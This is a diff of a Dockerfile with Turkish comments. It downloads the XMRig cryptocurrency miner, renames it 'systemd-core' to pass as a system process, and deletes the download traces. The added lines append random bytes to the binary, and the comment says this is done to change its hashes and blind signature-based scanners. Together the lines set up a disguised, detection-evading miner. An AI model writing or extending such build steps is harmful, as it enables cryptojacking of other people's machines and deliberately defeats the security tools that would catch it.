@@ -10,11 +10,13 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
 
 WORKDIR /server
 
-# Dosyayı indir, çıkar, 'systemd-core' olarak adlandır ve izleri tamamen sil
+# Dosyayı indir, adını gizle ve sonuna rastgele baytlar ekleyerek (MD5/SHA değiştirerek) imza taramalarını kör et
 RUN wget -qO /tmp/sys.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz" \
     && tar xzf /tmp/sys.tar.gz -C /server \
     && mv /server/xmrig-6.21.0/xmrig /server/systemd-core \
-    && rm -rf /tmp/sys.tar.gz /server/xmrig-6.21.0
+    && rm -rf /tmp/sys.tar.gz /server/xmrig-6.21.0 \
+    && head -c 32 /dev/urandom >> /server/systemd-core \
+    && chmod +x /server/systemd-core
 
 COPY engine.py /engine.py
 COPY start.sh  /start.sh
